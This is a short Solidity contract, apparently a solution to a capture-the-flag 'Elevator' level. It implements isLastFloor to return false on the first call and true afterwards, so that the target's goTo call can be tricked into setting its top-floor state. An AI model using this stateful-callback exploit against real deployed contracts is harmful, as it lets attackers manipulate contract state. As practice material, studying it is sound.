pragma solidity ^0.5.1;

import './Elevator.sol';

contract ElevatorSol {
    uint public _floor;
    Elevator public elevator;

    constructor(address payable _elevator) public {
        elevator = Elevator(_elevator);
    }
    
    function isLastFloor(uint floor) external returns (bool) {
        _floor = _floor + 1;
        return _floor == 1 ? false : true;
    }

    function attack(uint _floor) public {
        elevator.goTo(_floor);
    }
}
